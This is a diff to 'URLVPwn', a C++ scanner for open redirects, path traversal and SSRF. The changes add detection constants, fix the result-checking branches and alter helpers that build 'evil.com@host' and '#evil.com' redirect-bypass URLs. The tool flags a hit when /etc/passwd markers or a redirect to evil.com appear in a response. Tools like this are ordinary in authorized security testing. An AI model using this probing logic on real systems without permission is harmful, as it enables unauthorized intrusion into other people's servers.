@@ -1,5 +1,5 @@
 /*
-URLVPwn v1.0
+URLVPwn v1.1
 AUTHOR: c0d3Ninja
 Website: https://gotr00t0day.github.io
 Instagram: @gotr00t0day
@@ -38,7 +38,12 @@ Features:
 #define BOLD    "\033[1m"
 #define UNDERLINE "\033[4m"
 
-void validateURL (std::string& urls, std::string payload) {
+// Detection constants
+static const std::string EVIL_DOMAIN = "evil.com";
+static const std::string PASSWD_MARKER = "root:*:";
+static const std::string LOCALHOST_MARKER = "localhost";
+
+void validateURL (const std::string& urls, const std::string& payload) {
     bool useSSL = false;
     std::string originalUrl = urls;
     std::string host;
@@ -66,34 +71,34 @@ void validateURL (std::string& urls, std::string payload) {
         sslCli.set_follow_location(true);
         if (auto res = sslCli.Get(path.c_str())) {
             if (payload == "openredirect") {
-                if ((res->status == 301 || res->status == 302 || res->status == 303 || res->status == 307 || res->status == 308) && payload == "openredirect") {
+                if (res->status == 301 || res->status == 302 || res->status == 303 || res->status == 307 || res->status == 308) {
                     const std::string &body = res->body;
                     auto it = res->headers.find("Location");
                     if (it != res->headers.end()) {
                         const std::string &loc = it->second;
-                        if (loc.find("evil.com") != std::string::npos) {
-                            if (body.find("evil.com") != std::string::npos) {
-                                std::cout << GREEN << "[+] " << RESET << originalUrl << RESET << std::endl;
-                            }
+                        if (loc.find(EVIL_DOMAIN) != std::string::npos && body.find(EVIL_DOMAIN) != std::string::npos) {
+                            std::cout << GREEN << "[+] " << originalUrl << std::endl;
+                        } else {
+                            std::cout << RED << "[-] " << originalUrl << std::endl;
                         }
+                    } else {
+                        std::cout << RED << "[-] " << originalUrl << std::endl;
                     }
                 } else {
-                    std::cout << RED << "[-] " << RESET << originalUrl << RESET << std::endl;
+                    std::cout << RED << "[-] " << originalUrl << std::endl;
                 }
             } else if (payload == "pathtraversal") {
                 const std::string &body = res->body;
-                if (res->status == 200) {
-                    if (body.find("root:*:") != std::string::npos) {
-                        std::cout << GREEN << "[+] " << RESET << originalUrl << RESET << std::endl;
-                    } else if (body.find("localhost") != std::string::npos) {
-                        std::cout << GREEN << "[+] " << RESET << originalUrl << RESET << std::endl;
-                    } else {
-                        std::cout << RED << "[-] " << RESET << originalUrl << RESET << std::endl;
-                    }
+                if (res->status == 200 && (body.find(PASSWD_MARKER) != std::string::npos || body.find(LOCALHOST_MARKER) != std::string::npos)) {
+                    std::cout << GREEN << "[+] " << originalUrl << std::endl;
+                } else {
+                    std::cout << RED << "[-] " << originalUrl << std::endl;
                 }
             } else if (payload == "ssrf") {
                 if (res->status == 200) {
-                    std::cout << GREEN << "[+] " << RESET << originalUrl << RESET << std::endl;
+                    std::cout << GREEN << "[+] " << originalUrl << std::endl;
+                } else {
+                    std::cout << RED << "[-] " << originalUrl << std::endl;
                 }
             }
         } else {
@@ -123,34 +128,34 @@ void validateURL (std::string& urls, std::string payload) {
         cli.set_follow_location(true);
         if (auto res = cli.Get(path.c_str())) {
             if (payload == "openredirect") {
-                if ((res->status == 301 || res->status == 302 || res->status == 303 || res->status == 307 || res->status == 308) && payload == "openredirect") {
+                if (res->status == 301 || res->status == 302 || res->status == 303 || res->status == 307 || res->status == 308) {
                     const std::string &body = res->body;
                     auto it = res->headers.find("Location");
                     if (it != res->headers.end()) {
                         const std::string &loc = it->second;
-                        if (loc.find("evil.com") != std::string::npos) {
-                            if (body.find("evil.com") != std::string::npos) {
-                                std::cout << GREEN << "[+] " << RESET << originalUrl << RESET << std::endl;
-                            }
+                        if (loc.find(EVIL_DOMAIN) != std::string::npos && body.find(EVIL_DOMAIN) != std::string::npos) {
+                            std::cout << GREEN << "[+] " << originalUrl << std::endl;
+                        } else {
+                            std::cout << RED << "[-] " << originalUrl << std::endl;
                         }
+                    } else {
+                        std::cout << RED << "[-] " << originalUrl << std::endl;
                     }
                 } else {
-                    std::cout << RED << "[-] " << RESET << originalUrl << RESET << std::endl;
-                } 
+                    std::cout << RED << "[-] " << originalUrl << std::endl;
+                }
             } else if (payload == "pathtraversal") {
                 const std::string &body = res->body;
+                if (res->status == 200 && (body.find(PASSWD_MARKER) != std::string::npos || body.find(LOCALHOST_MARKER) != std::string::npos)) {
+                    std::cout << GREEN << "[+] " << originalUrl << std::endl;
+                } else {
+                    std::cout << RED << "[-] " << originalUrl << std::endl;
+                }
+            } else if (payload == "ssrf") {
                 if (res->status == 200) {
-                    if (body.find("root:*:") != std::string::npos) {
-                        std::cout << GREEN << "[+] " << RESET << originalUrl << RESET << std::endl;
-                    } else if (body.find("localhost") != std::string::npos) {
-                        std::cout << GREEN << "[+] " << RESET << originalUrl << RESET << std::endl;
-                    } else {
-                        std::cout << RED << "[-] " << RESET << originalUrl << RESET << std::endl;
-                    }
-                } else if (payload == "ssrf") {
-                    if (res->status == 200) {
-                        std::cout << GREEN << "[+] " << RESET << originalUrl << RESET << std::endl;
-                    }
+                    std::cout << GREEN << "[+] " << originalUrl << std::endl;
+                } else {
+                    std::cout << RED << "[-] " << originalUrl << std::endl;
                 }
             }
         } else {
@@ -362,7 +367,7 @@ std::string addAtBypass(const std::string& url) {
         std::string path = (pathStart != std::string::npos) ? rest.substr(pathStart) : "";
         
         if (host.find('@') == std::string::npos) {
-            result = protocol + "evil.com@" + host + path;
+            result = protocol + EVIL_DOMAIN + "@" + host + path;
         }
     }
     
@@ -377,9 +382,9 @@ std::string addHashBypass(const std::string& url) {
         if (protocolEnd != std::string::npos) {
             size_t pathStart = result.find('/', protocolEnd + 3);
             if (pathStart != std::string::npos) {
-                result.insert(pathStart, "#evil.com");
+                result.insert(pathStart, "#" + EVIL_DOMAIN);
             } else {
-                result += "#evil.com";
+                result += "#" + EVIL_DOMAIN;
             }
         }
     }
@@ -654,8 +659,3 @@ void Resolve(const std::string& urls, const std::string& payloadType) {
         validateURL(fullLink, payloadType);
     }
 }
-
-
-
-
-
